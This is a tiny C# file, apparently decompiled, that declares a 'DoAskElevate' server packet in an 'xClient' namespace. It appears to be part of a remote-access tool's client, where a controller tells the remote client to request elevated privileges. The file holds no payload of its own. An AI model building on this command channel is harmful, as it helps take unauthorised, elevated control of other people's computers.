using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoAskElevate : GInterface4
{
	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
